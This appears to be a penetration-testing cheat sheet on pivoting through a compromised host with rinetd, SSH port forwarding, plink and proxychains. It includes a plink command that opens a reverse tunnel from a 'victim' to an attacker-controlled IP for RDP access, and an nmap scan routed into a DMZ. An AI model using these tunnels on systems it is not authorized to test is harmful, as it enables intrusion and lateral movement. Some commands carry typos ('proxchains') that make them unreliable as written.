## Port Forwarding

```
# install rinetd
nano /etc/rinetd.conf
# bindadress bindport connectaddress connectport 
wxyz         53       a.b.c.d        80

service rinetd restart
```

## SSH Local and Remote Port Forwarding
```
# local port forwarding, connect from local port to remote port over ssh
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>


# remote port forwarding, connect remote port to local port over ssh
# copy over plink.exe, make sure sshd is running on attacker
plink.exe -l root -pw supersecretpassword 208.x.x.x -R 3390:127.0.0.1:3389      #victim
# this will open up 3390 on local attacking box, and router traffic from this port to 3389 on the remote ip.
rdesktop -u user -p pass 127.0.0.1:3390                                         #attacker
```

## Dynamic Port Forwarding
```
# ssh -D <local proxy port> -p <remote port> <target>
ssh -D 8080 root@victim    # on attacker, socks4 proxy
```

## Proxy Chains
```
nano /etc/proxchains.conf

socks4 127.0.0.1 8080        
# make sure dynamic port forwarding is already setup  (ssh -D 8080 root@victim)

proxchains nmap -p 22 -sT -Pn 10.x.x.x --open  # can nmap scan into dmz'd network.
